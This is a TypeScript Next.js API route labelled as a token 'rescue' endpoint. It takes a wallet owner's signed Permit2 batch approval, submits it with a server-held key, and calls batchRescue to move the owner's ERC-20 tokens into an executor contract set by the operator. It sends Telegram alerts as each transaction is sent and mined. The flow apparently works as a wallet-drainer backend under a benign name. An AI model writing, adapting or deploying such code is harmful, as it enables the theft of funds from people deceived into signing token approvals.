// src/app/api/rescue/route.ts

import { NextResponse } from "next/server";
import { ethers } from "ethers";
import { sendTelegramAlert } from "@/server/telegram";

const PERMIT2_ABI = [
  "function permit(address owner, tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce)[] details,address spender,uint256 sigDeadline) permitBatch, bytes signature) external",
] as const;

const RESCUE_ABI = [
  "function batchRescue(address owner, address[] tokens, uint256[] amounts) external",
  "event Rescued(address indexed token, address indexed from, uint256 amount)",
  "event RescueFailed(address indexed token, address indexed from, bytes reason)",
] as const;

function mustEnv(name: string) {
  const v = process.env[name];
  if (!v) throw new Error(`Missing env var: ${name}`);
  return v;
}

function isAddress(x: any): x is string {
  return typeof x === "string" && /^0x[a-fA-F0-9]{40}$/.test(x);
}

function toLowerAddr(a: string) {
  return a.toLowerCase();
}

function isUintString(x: any): x is string {
  if (typeof x !== "string") return false;
  if (!/^\d+$/.test(x)) return false;
  try {
    return BigInt(x) >= 0n;
  } catch {
    return false;
  }
}

type InputToken = { token: string; amount: string };

type PermitDetail = {
  token: string;
  amount: string; // uint160 decimal string
  expiration: number; // uint48
  nonce: number; // uint48
};

type PermitBatch = {
  details: PermitDetail[];
  spender: string;
  sigDeadline: string; // uint256 decimal string
};

function validatePermitBatch(pb: any): pb is PermitBatch {
  if (!pb || typeof pb !== "object") return false;
  if (!Array.isArray(pb.details)) return false;
  if (!isAddress(pb.spender)) return false;
  if (!isUintString(pb.sigDeadline)) return false;

  for (const d of pb.details) {
    if (!d || typeof d !== "object") return false;
    if (!isAddress(d.token)) return false;
    if (!isUintString(String(d.amount))) return false;
    if (typeof d.expiration !== "number" || !Number.isFinite(d.expiration)) return false;
    if (typeof d.nonce !== "number" || !Number.isFinite(d.nonce)) return false;
  }
  return true;
}

function decodeReasonBytes(reasonHex: string): string {
  try {
    if (reasonHex?.startsWith("0x08c379a0")) {
      const encoded = "0x" + reasonHex.slice(10);
      const [msg] = ethers.AbiCoder.defaultAbiCoder().decode(["string"], encoded);
      return String(msg);
    }
  } catch {}
  return reasonHex;
}

export async function POST(req: Request) {
  try {
    const body = await req.json().catch(() => ({}));

    const owner = body?.owner;
    const tokens = body?.tokens;
    const permitBatch = body?.permitBatch;
    const signature = body?.signature;

    if (!isAddress(owner)) {
      return NextResponse.json({ error: "Invalid owner" }, { status: 400 });
    }
    if (!Array.isArray(tokens)) {
      return NextResponse.json({ error: "tokens[] required" }, { status: 400 });
    }

    const normalizedTokens: InputToken[] = [];
    for (const t of tokens) {
      const token = t?.token;
      const amount = t?.amount;

      if (!isAddress(token)) {
        return NextResponse.json({ error: "Invalid token address in tokens[]" }, { status: 400 });
      }
      if (!isUintString(amount)) {
        return NextResponse.json({ error: "Invalid amount in tokens[] (uint string)" }, { status: 400 });
      }
      if (BigInt(amount) <= 0n) continue; // filter zeros

      normalizedTokens.push({ token: toLowerAddr(token), amount });
    }

    // ✅ EARLY EXIT (no gas)
    if (normalizedTokens.length === 0) {
      return NextResponse.json(
        {
          ok: true,
          skipped: "no-erc20-found",
          owner: toLowerAddr(owner),
          permit: { ok: false, skipped: true },
          rescue: { ok: false, skipped: true },
        },
        { status: 200 }
      );
    }

    if (!validatePermitBatch(permitBatch)) {
      return NextResponse.json({ error: "Invalid permitBatch" }, { status: 400 });
    }
    if (typeof signature !== "string" || !signature.startsWith("0x")) {
      return NextResponse.json({ error: "Invalid signature" }, { status: 400 });
    }

    const PERMIT2 = mustEnv("NEXT_PUBLIC_PERMIT2");
    const EXECUTOR = mustEnv("NEXT_PUBLIC_EXECUTOR");
    if (!isAddress(PERMIT2) || !isAddress(EXECUTOR)) {
      return NextResponse.json({ error: "Server misconfigured contract addresses" }, { status: 500 });
    }

    if (toLowerAddr(permitBatch.spender) !== toLowerAddr(EXECUTOR)) {
      return NextResponse.json(
        { error: "permitBatch.spender must equal executor contract address" },
        { status: 400 }
      );
    }

    const permitTokenSet = new Set(permitBatch.details.map((d) => toLowerAddr(d.token)));
    for (const t of normalizedTokens) {
      if (!permitTokenSet.has(toLowerAddr(t.token))) {
        return NextResponse.json({ error: `permitBatch.details missing token ${t.token}` }, { status: 400 });
      }
    }

    const rpcUrl = mustEnv("MAINNET_RPC_URL");
    const pk = mustEnv("RESCUE_SIGNER_PRIVATE_KEY");
    const provider = new ethers.JsonRpcProvider(rpcUrl);
    const signer = new ethers.Wallet(pk, provider);

    const permit2 = new ethers.Contract(PERMIT2, PERMIT2_ABI, signer);
    const rescue = new ethers.Contract(EXECUTOR, RESCUE_ABI, signer);

    // 1) Permit2.permit
    let permitTxHash: string | null = null;
    let permitOk = false;
    let permitError: string | null = null;

    try {
      const tx = await permit2.permit(owner, permitBatch, signature);
      permitTxHash = tx.hash;

      // ✅ Telegram: tx sent
      await sendTelegramAlert({
        title: "Permit2 permit tx sent",
        lines: [
          `owner: ${toLowerAddr(owner)}`,
          `executor: ${toLowerAddr(EXECUTOR)}`,
          `tx: ${permitTxHash}`,
        ],
      });

      await tx.wait();
      permitOk = true;
    } catch (e: any) {
      permitError = e?.shortMessage || e?.message || "Permit2.permit failed";
      permitOk = false;
    }

    // 2) batchRescue
    const tokenAddrs = normalizedTokens.map((t) => t.token);
    const amounts = normalizedTokens.map((t) => t.amount);

    let rescueTxHash: string | null = null;
    let rescued: { token: string; from: string; amount: string }[] = [];
    let failed: { token: string; from: string; reason: string }[] = [];
    let rescueOk = false;
    let rescueError: string | null = null;

    try {
      const tx = await rescue.batchRescue(owner, tokenAddrs, amounts);
      rescueTxHash = tx.hash;

      // ✅ Telegram: tx sent
      await sendTelegramAlert({
        title: "ERC20 batchRescue tx sent",
        lines: [
          `owner: ${toLowerAddr(owner)}`,
          `tokens: ${tokenAddrs.length}`,
          `tx: ${rescueTxHash}`,
        ],
      });

      const receipt = await tx.wait();
      rescueOk = true;

      const iface = new ethers.Interface(RESCUE_ABI);
      for (const log of receipt.logs) {
        try {
          const parsed = iface.parseLog(log);
          if (parsed?.name === "Rescued") {
            rescued.push({
              token: toLowerAddr(String(parsed.args.token)),
              from: toLowerAddr(String(parsed.args.from)),
              amount: String(parsed.args.amount),
            });
          } else if (parsed?.name === "RescueFailed") {
            failed.push({
              token: toLowerAddr(String(parsed.args.token)),
              from: toLowerAddr(String(parsed.args.from)),
              reason: decodeReasonBytes(String(parsed.args.reason)),
            });
          }
        } catch {}
      }

      // ✅ Telegram: mined summary (optional)
      await sendTelegramAlert({
        title: "ERC20 batchRescue tx mined",
        lines: [
          `tx: ${rescueTxHash}`,
          `rescued events: ${rescued.length}`,
          `failed events: ${failed.length}`,
        ],
      });
    } catch (e: any) {
      rescueOk = false;
      rescueError = e?.shortMessage || e?.message || "batchRescue failed";
    }

    return NextResponse.json(
      {
        ok: permitOk && rescueOk,
        owner: toLowerAddr(owner),
        permit2: toLowerAddr(PERMIT2),
        executor: toLowerAddr(EXECUTOR),
        permit: { ok: permitOk, txHash: permitTxHash, error: permitError },
        rescue: { ok: rescueOk, txHash: rescueTxHash, rescued, failed, error: rescueError },
      },
      { status: 200 }
    );
  } catch (e: any) {
    return NextResponse.json({ error: e?.message ?? "rescue route failed" }, { status: 500 });
  }
}
